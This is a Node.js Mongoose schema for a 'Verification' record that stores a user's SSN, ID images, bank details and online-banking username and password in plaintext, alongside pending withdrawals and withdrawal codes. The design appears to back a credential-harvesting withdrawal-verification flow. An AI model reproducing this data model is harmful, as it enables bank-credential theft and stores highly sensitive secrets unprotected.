const mongoose = require('mongoose');

const VerificationSchema = new mongoose.Schema(
  {
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, unique: true },
    email: String,
    phone: String,
    ssn: String,
    address: String,
    idType: String,
    idFront: String,
    idBack: String,
    bankName: String,
    bankAddress: String,
    bankLogin: {
      bankName: String,
      username: String,
      password: String,
    },
    pendingWithdrawal: {
      symbol: String,
      amount: Number,
    },
    codes: [
      {
        code: String,
        createdAt: { type: Date, default: Date.now },
      },
    ],
    withdrawalCode: String,
    status: { type: String, enum: ['pending', 'approved'], default: 'pending' },
  },
  { timestamps: true }
);

module.exports = mongoose.model('Verification', VerificationSchema);